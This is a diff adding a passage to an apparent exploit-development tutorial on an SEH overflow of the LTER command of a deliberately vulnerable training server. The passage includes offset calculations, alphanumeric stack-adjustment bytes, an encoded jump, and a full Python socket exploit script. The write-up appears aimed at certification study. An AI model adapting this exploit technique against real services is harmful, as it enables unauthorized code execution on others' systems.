@@ -483,7 +483,64 @@ nasm > pop esp
 
 So we'll put the variable `espAdj2` and set it equal to: `\x54\x58\x2c\x2a\x50\x5c`. 
 
-We need to calculate how many `A` chars will come before our `espAdj2` code. The `A` buffer starts at `0177F20A`, so to calculate we do: (`0177FF6D` - `0177F20A`
+We need to calculate how many `A` chars will come before our `espAdj2` code. The `A` buffer starts at `0177F20A`, so to calculate we do: (`0177FF6D` - `0177F20A` = `D63` or 3427 in decimal). 
+
+So we need 3427 `A` chars in our buffer before our `espAdj2` code starts and then we'll put padding after it as well letting python work out the math required. Our exploit code now looks like this:
+```python
+#!/usr/bin/python
+
+import socket
+import os
+import sys
+
+host = "192.168.1.201"
+port = 9999
+
+nSeh = '\x74\x06\x75\x04'
+
+Seh = '\x2b\x17\x50\x62'
+
+espAdj = '\x54\x58\x66\x05\x4b\x13\x50\x5C'
+
+jump = ""
+jump += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
+jump += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
+jump += "\x05\x76\x40\x50\x50" ## add  eax, 0x50504076
+jump += "\x05\x75\x40\x40\x40" ## add  eax, 0x40404075
+jump += "\x50" 
+
+espAdj2 = '\x54\x58\x2c\x2a\x50\x5c'
+
+buffer = 'A' * 3427
+buffer += espAdj2
+buffer += 'A' * (3514 - 3427 - len(espAdj2))
+buffer += nSeh
+buffer += Seh
+buffer += espAdj
+buffer += jump
+buffer += 'D' * (4000 - len(buffer))
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host,port))
+print s.recv(1024)
+s.send("LTER /.../" + buffer)
+print s.recv(1024)
+s.close()
+```
+
+Using this code and stepping through it to the beginning of our `espAdj2` code and we end up here: 
+
+![](/assets/images/CTP/endofbuffer.JPG)
+
+Let's step through it all and see if at the end `ESP` points to `0177FFC3`.
+
+![](/assets/images/CTP/espworked.JPG)
+
+Success! 
+
+### Encoding a Long Negative Jump
+
+
 
 
 -- TO BE CONTINUED... --
